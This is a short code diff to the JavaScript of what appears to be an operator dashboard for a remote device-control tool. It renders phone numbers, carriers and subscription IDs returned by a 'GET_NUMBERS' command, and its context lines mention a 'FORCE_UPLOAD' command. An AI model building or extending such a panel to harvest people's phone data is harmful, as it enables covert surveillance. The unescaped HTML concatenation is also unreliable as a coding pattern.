@@ -1091,7 +1091,7 @@
                 }
 
                 if (c.file_name === 'GET_NUMBERS' && c.result_data && c.result_data.sim_cards) {
-                    dataHtml = '<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.05); border:1px solid #333;"><div style="color:var(--primary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">SIM_HARDWARE_REGISTRY</div>' + c.result_data.sim_cards.map(sim => '<div style="margin-bottom:8px; border-left:2px solid var(--success); padding-left:8px;"><div style="color:#fff; font-size:0.85rem;">' + sim.number + '</div><div style="color:#666; font-size:0.6rem;">SLOT: ' + sim.slot + ' | CARRIER: ' + sim.carrier + ' | ' + sim.country.toUpperCase() + '</div></div>').join('') + '</div>';
+                    dataHtml = '<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.05); border:1px solid #333;"><div style="color:var(--primary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">SIM_HARDWARE_REGISTRY</div>' + c.result_data.sim_cards.map(sim => '<div style="margin-bottom:8px; border-left:2px solid var(--success); padding-left:8px;"><div style="color:#fff; font-size:0.85rem;">' + sim.number + '</div><div style="color:#666; font-size:0.6rem;">SLOT: ' + sim.slot + ' | CARRIER: ' + sim.carrier + ' | ' + sim.country.toUpperCase() + '</div><div style="color:var(--primary); font-family:monospace; font-size:0.55rem; margin-top:2px; opacity:0.8;">SUB_ID: ' + sim.id + '</div></div>').join('') + '</div>';
                 }
 
                 if (type === 'FORCE_UPLOAD') {
